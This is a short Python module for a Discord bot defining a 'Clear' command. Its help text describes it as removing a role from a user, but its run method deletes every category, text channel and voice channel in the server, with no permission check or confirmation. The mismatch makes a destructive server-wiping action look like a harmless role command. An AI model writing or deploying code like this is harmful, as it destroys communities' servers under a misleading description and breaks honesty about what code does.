from . import command
from discord.utils import get
import discord
from discord.ext.commands import Bot
import os
import re

class Clear(command.Command):
    def __init__(self, helpmessage):
        helpmessage.append("Load: 'leave @role' removes role @role from user")

    async def run(self, message):
        categories = message.guild.categories
        for category in categories:
            await category.delete()

        txts = message.guild.text_channels
        for txt in txts:
            await txt.delete()

        voices = message.guild.voice_channels
        for voice in voices:
            await voice.delete()
       
        